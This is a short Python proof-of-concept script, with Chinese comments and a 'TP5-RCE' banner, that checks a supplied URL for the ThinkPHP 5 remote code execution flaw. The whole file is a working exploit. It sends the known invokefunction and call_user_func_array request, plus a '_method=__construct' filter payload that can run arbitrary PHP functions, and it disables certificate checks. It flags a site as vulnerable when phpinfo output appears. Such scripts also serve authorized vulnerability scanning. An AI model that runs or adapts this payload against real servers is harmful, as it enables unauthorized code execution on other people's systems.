import argparse
import textwrap
import requests
import sys
requests.packages.urllib3.disable_warnings()

def main(url, func="phpinfo"):
    # 1.发请求
    full_url = fr"{url}?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    data = {"_method": "__construct", "filter[]": f"{func}", "method": "get", "server[REQUEST_METHOD]": "-1"}
    try:
        response = requests.post(full_url, data=data,verify=False, timeout=5, allow_redirects=False)
    except Exception:
        print(f"[-]{url} 请求失败")
        sys.exit(1)
    # 2.判断是否存在漏洞
    if response.status_code == 200 and "PHP Extension Build" in response.text:
        print(f"[+]{url} 存在远程代码执行漏洞")
    else:
        print(f"[-]{url} 不存在远程代码执行漏洞")


def banner():
    banner = '''
  _______ _____  _____       _____   _____ ______ 
 |__   __|  __ \| ____|     |  __ \ / ____|  ____|
    | |  | |__) | |__ ______| |__) | |    | |__   
    | |  |  ___/|___ \______|  _  /| |    |  __|  
    | |  | |     ___) |     | | \ \| |____| |____ 
    |_|  |_|    |____/      |_|  \_\\_____|______|

                                                  '''
    print(banner)


if __name__ == '__main__':
    banner()
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="thinkphp5 rce poc",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
        python3 5-rce-poc.py -u http://192.168.1.108
        '''))
    # 添加参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    # 把参数的值解析到对象中
    args = parser.parse_args()

    main(args.url)